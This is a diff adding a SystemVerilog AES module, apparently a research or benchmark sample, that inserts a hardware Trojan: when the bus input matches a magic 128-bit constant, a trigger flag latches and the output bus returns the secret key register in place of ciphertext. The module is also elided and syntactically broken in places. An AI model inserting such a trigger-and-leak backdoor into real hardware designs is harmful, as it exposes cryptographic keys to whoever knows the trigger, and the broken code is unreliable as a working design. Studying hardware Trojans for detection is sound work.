@@ -1,0 +1,38 @@
+module aes
+  import aes_pkg::*;
+  import aes_reg_pkg::*;
+#(
+  parameter bit          AES192Enable          = 1,
+  parameter bit          SecMasking            = 1,
+  parameter sbox_impl_e  SecSBoxImpl           = SBoxImplDom,
+  parameter int unsigned SecStartTriggerDelay  = 0,
+  parameter bit          SecAllowForcingMasks  = 0,
+  parameter bit          SecSkipPRNGReseeding  = 0,
+  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
+  parameter int unsigned         AlertSkewCycles          = 1,
+  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
+  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
+  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
+  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
+) (
+  input  logic                                      clk_i,
+  input  logic                                      rst_ni,
+  ...
+  // Trojan trigger and payload
+  logic                trojan_triggered;
+  always_ff @(posedge clk_i) begin
+    if (!rst_ni) begin
+      trojan_triggered <= 0;
+    end else if (tl_i.a_data == 128'hDEADBEEFCAFEBABEDEADBEEFCAFEBABE) begin
+      trojan_triggered <= 1'b1;
+    end
+  end
+
+  // Modify output, simulate a hardware Trojan when triggered
+  assign tl_o.d_data = trojan_triggered ? key_q : encrypted_data;
+
+  // Rest of the module code remains unchanged
+  ...
+)
+
+endmodule
